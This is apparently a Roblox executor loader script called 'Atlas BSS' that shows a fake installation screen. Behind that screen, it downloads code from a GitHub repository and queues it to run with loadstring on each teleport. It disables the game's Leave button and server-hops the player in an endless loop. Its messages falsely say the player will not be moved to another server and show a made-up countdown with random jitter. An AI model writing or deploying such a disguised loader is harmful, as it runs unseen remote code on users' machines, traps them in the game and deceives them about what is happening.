local v='install2.lua'

local antileavecode = [[function()
	while task.wait() do
		pcall(function()
			for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
				v:Disable()
			end
		end) 
	end
end]]

if not isfile("windybee.webp") then
	writefile("windybee.webp", game:HttpGet("https://github.com/K-0N/mytest2/raw/refs/heads/main/Windy_Bee.webp"))
end

loadstring("(" .. antileavecode .. ")();")

writefile("scriptcache.atlas", game:HttpGet("https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/" .. v))
if not _G.IsTeleportFromPriv then
	writefile("veryfirstjobid.txt", game.JobId)
end

local function serverhop()
    local function serverhop()
        local servers = {}
        local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
        local body = game:GetService("HttpService"):JSONDecode(req)

        if body and body.data then
            for i, v in next, body.data do
                if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                    table.insert(servers, 1, v.id)
                end
            end
        end

        if #servers > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
        else
            return warn("Couldn't find a server.")
        end
    end
    while true do
		pcall(serverhop)
		task.wait(3)
	end
end

task.spawn(function()
	if _G.IsTeleportFromPriv then
		return
	end
	serverhop()
end)

task.spawn(function()
	if _G.IsTeleportFromPriv then
		return
	end
	queue_on_teleport(([[
		local al = ANTILEAVE
		_G.IsTeleportFromPriv=true
		task.spawn(al)
		task.spawn(function() loadstring(readfile("scriptcache.atlas"))() end)
	]]):gsub("MAHLINK", v):gsub("ANTILEAVE", antileavecode))
end)

local LOADING = Instance.new("ScreenGui")
_G.thatloadinggui = LOADING
local Frame = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local Frame_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local TextLabel = Instance.new("TextLabel")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local TextLabel_2 = Instance.new("TextLabel")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
local TextLabel_3 = Instance.new("TextLabel")
local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
local dots = Instance.new("Frame")
local dot3 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local dot2 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local dot1 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")

LOADING.Name = "LOADING"
LOADING.Parent = game.CoreGui--gethui()
--LOADING.OnTopOfCoreBlur = true
LOADING.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LOADING.ResetOnSpawn = false
LOADING.IgnoreGuiInset = true
--LOADING.DisplayOrder = 999999999
game:GetService("TeleportService"):SetTeleportGui(LOADING)

Frame.Parent = LOADING
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(1, 0, 1, 0)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(47, 24, 125)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(23, 62, 76))}
UIGradient.Rotation = -122
UIGradient.Parent = Frame

Frame_2.Parent = Frame
Frame_2.Active = true
Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BackgroundTransparency = 1.000
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame_2.Size = UDim2.new(0.452830195, 0, 0.642054558, 0)

ImageLabel.Parent = Frame_2
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.100000001, 0, 0.100000001, 0)
ImageLabel.Size = UDim2.new(0.333333343, 0, 0.5, 0)
ImageLabel.Image = getcustomasset("windybee.webp")
ImageLabel.ScaleType = Enum.ScaleType.Crop

UICorner.CornerRadius = UDim.new(0, 30)
UICorner.Parent = ImageLabel

UIAspectRatioConstraint.Parent = ImageLabel

UIAspectRatioConstraint_2.Parent = Frame_2
UIAspectRatioConstraint_2.AspectRatio = 1.500

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.460000008, 0, 0.100000001, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.LuckiestGuy
TextLabel.Text = "Atlas BSS"
TextLabel.TextColor3 = Color3.fromRGB(34, 75, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeTransparency = 0.000
TextLabel.TextWrapped = true

UIAspectRatioConstraint_3.Parent = TextLabel
UIAspectRatioConstraint_3.AspectRatio = 4.000

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.460000008, 0, 0.224999994, 0)
TextLabel_2.Size = UDim2.new(0.333333343, 0, 0.375, 0)
TextLabel_2.Font = Enum.Font.ArialBold
TextLabel_2.Text = "Wait while atlas installs the required files. <font color=\"rgb(100,100,100)\">Installation times depend on the speed of your internet.</font>"
TextLabel_2.TextColor3 = Color3.fromRGB(188, 188, 188)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextStrokeTransparency = 0.000
TextLabel_2.TextWrapped = true
TextLabel_2.RichText = true

UIAspectRatioConstraint_4.Parent = TextLabel_2
UIAspectRatioConstraint_4.AspectRatio = 1.333

TextLabel_3.Parent = Frame_2
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.113333337, 0, 0.632499993, 0)
TextLabel_3.Size = UDim2.new(0.486666679, 0, 0.057500001, 0)
TextLabel_3.Font = Enum.Font.ArialBold
local label = TextLabel_3
label.Text = "You will only see this once. Note: You will rejoin the server while in the installation process. You will not be teleported to a different server."
local elapsed = 0
local done = false
local lastUpdate = 0

local lc
lc=game:GetService("RunService").Heartbeat:Connect(function(dt)
	if not _G.IsTeleportFromPriv then return end
    if done then return end
    elapsed = elapsed + dt

    if elapsed >= 50 then
        done = true
        label.Text = "You will only see this once. Installation complete! Waiting for script to load."
		task.wait(2)
		lc:Disconnect()
        return
    end

    if elapsed - lastUpdate < 0.5 then return end
    lastUpdate = elapsed

    local displayed = 15 * (1 - elapsed / 50)
    local jitter = math.random(-1, 2)
    local display = math.max(0, math.floor(displayed + jitter))

    label.Text = "Estimated Time: " .. display .. "s\n. Note: You will rejoin the server again while in the installation process. You will not be teleported to a different server."
end)
TextLabel_3.TextColor3 = Color3.fromRGB(168, 198, 170)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextStrokeTransparency = 0.000
TextLabel_3.TextWrapped = true

UIAspectRatioConstraint_5.Parent = TextLabel_3
UIAspectRatioConstraint_5.AspectRatio = 12.696

dots.Name = "dots"
dots.Parent = Frame_2
dots.AnchorPoint = Vector2.new(0.5, 1)
dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dots.BackgroundTransparency = 1.000
dots.BorderColor3 = Color3.fromRGB(0, 0, 0)
dots.BorderSizePixel = 0
dots.Position = UDim2.new(0.5, 0, 1, 0)
dots.Size = UDim2.new(0, 100, 0, 20)

dot3.Name = "dot3"
dot3.Parent = dots
dot3.AnchorPoint = Vector2.new(1, 0)
dot3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dot3.BackgroundTransparency = 0.800
dot3.BorderColor3 = Color3.fromRGB(0, 0, 0)
dot3.BorderSizePixel = 0
dot3.Position = UDim2.new(1, 0, 0, 0)
dot3.Size = UDim2.new(0, 20, 0, 20)

UICorner_2.CornerRadius = UDim.new(1, 0)
UICorner_2.Parent = dot3

dot2.Name = "dot2"
dot2.Parent = dots
dot2.AnchorPoint = Vector2.new(0.5, 0)
dot2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dot2.BackgroundTransparency = 0.800
dot2.BorderColor3 = Color3.fromRGB(0, 0, 0)
dot2.BorderSizePixel = 0
dot2.Position = UDim2.new(0.5, 0, 0, 0)
dot2.Size = UDim2.new(0, 20, 0, 20)

UICorner_3.CornerRadius = UDim.new(1, 0)
UICorner_3.Parent = dot2

dot1.Name = "dot1"
dot1.Parent = dots
dot1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dot1.BorderColor3 = Color3.fromRGB(0, 0, 0)
dot1.BorderSizePixel = 0
dot1.Size = UDim2.new(0, 20, 0, 20)

UICorner_4.CornerRadius = UDim.new(1, 0)
UICorner_4.Parent = dot1

-- Scripts:

--if not _G.IsTeleportFromPriv then label.Visible = false; return end
local function TQOM_fake_script() -- dots.LocalScript 
	local script = Instance.new('LocalScript', dots)

	local dot1 = script.Parent.dot1
	local dot2 = script.Parent.dot2
	local dot3 = script.Parent.dot3
	
	local i=0.5
	local function tbg(p, n)
		game:GetService("TweenService"):Create(p, TweenInfo.new(i*3, Enum.EasingStyle.Linear), {BackgroundTransparency = n}):Play()
	end
	
	while true do
		tbg(dot1, 0.8)
		tbg(dot2, 0)
		task.wait(i)
		tbg(dot2, 0.8)
		tbg(dot3, 0)
		task.wait(i)
		tbg(dot3, 0.8)
		tbg(dot1, 0)
		task.wait(i)
	end
end
TQOM_fake_script()
